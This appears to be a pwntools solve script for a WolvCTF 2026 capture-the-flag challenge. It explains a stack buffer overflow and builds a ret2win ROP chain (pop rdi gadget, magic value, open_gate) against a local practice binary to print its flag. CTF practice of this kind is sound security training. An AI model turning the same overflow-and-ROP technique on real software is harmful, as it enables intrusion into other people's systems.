"""
title: Gate 7
ctf: WolvCTF 2026
category: pwn
difficulty: 1
arch: amd64
linking: dynamic
mitigation_gaps: [no-pie, no-canary, partial-relro, not-stripped]
vulnerabilities: [stack-overflow]
tags: [ret2win, rop]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Dynamically linked, no PIE, no canary.
# main() reads into a buffer at rbp-0x30 through read_full(), which keeps
# reading until it has gathered 0x80 bytes, overflowing the buffer, so saved
# RIP is controlled (about 9 words of ROP space).
# open_gate(arg) opens and prints /flag when arg equals a hardcoded magic, so
# it is the ret2win target. No PIE, addresses are fixed.
# Plan: overflow, load the magic into rdi with a pop rdi gadget, jump into
# open_gate. No alignment ret is needed here: open_gate prints through the raw
# open/read/write wrappers, which contain no movaps, so stack alignment is
# irrelevant for this target.

# =====
# CONSTANTS
# =====
BUFF_TO_RBP_OFF = 0x30           # buffer start to saved rbp
READ_BYTE_QUOTA = 0x80           # bytes read_full() consumes before returning
MAGIC_NUMBER = 0xc0ffee          # value open_gate checks against
OPEN_GATE_ADDR = 0x40120B        # ret2win target
POP_RDI_ADDR = 0x401206          # pop rdi gadget

# =====
# EXPLOIT
# =====

# Build the ret2win chain: magic into rdi, then open_gate.
payload = b"A" * (BUFF_TO_RBP_OFF + 0x8)            # overflow buffer + saved rbp
payload += p64(POP_RDI_ADDR)                        # 1st arg = magic number
payload += p64(MAGIC_NUMBER)
payload += p64(OPEN_GATE_ADDR)                      # jump to the target

# Pad to the read quota so read_full() returns and the chain fires.
payload += b"A" * (READ_BYTE_QUOTA - len(payload))

# Spawn the target and send the payload.
p = process("./gate7")
p.sendline(payload)

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
